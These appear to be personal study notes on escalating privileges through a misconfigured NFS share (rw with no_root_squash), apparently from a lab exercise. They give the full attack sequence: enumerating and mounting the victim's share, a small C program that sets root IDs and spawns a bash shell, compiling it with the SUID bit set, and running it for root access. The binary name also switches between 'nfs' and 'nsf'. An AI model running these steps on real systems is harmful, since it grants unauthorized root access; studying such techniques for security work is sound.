<https://resources.infosecinstitute.com/topic/exploiting-nfs-share/>

Network File Sharing

showmount -e 10.10.28.220    (shows mountable shares on victim, from our attacking machine)

cat /etc/exports     (Shows info about the NFS. Unless one of the shares doesn't have both rw, and no_root_squash, it will not work)

Let's proceed..

mkdir /tmp/attacker-backups (obviously on attacking machine)

mount -o rw 10.10.28.220:/home/ubuntu/sharefolder /tmp/attacker-backups 
(so this created a link between our attacker-backups folder and their sharefolder. From here, we can get pretty malicious).

nano nfs.c   (so here we're just creating a simple script that spawns a root shell if executed on victim)

int main()
{ setuid(0);
  setgid(0);
  system("/bin/bash");
  return 0;
}

gcc nfs.c -o nfs -w  (here we're just compiling this c program and we're calling it nfs)

chmod +s nfs     (this sets the SUID bit)

from here we just run the script like so: ./nsf   on victim machine and as we've already established connection to the NFS and share had both rw and no_root_squash, so when we compiled the c program, the newly compiled “nsf” file will arrive at victim, so no reason for file transfer.